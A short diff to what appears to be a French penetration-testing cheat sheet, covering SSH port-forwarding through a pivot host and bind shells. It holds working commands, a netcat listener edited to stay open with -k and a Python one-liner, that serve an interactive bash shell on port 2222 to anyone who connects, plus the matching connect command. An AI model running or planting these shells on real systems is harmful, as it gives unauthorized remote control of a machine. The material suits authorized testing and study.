@@ -23,7 +23,7 @@ ssh -NL port_local:cible_distante:port_cible_distante root@rebond</br>
 Ouvrent un shell sur le port 2222 :
 
 ```
- nc -lvp 2222 -e /bin/bash
+ nc -lkvp 2222 -e /bin/bash
  python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
 ```
 On se connecte avec nc -nv 2222 adress port
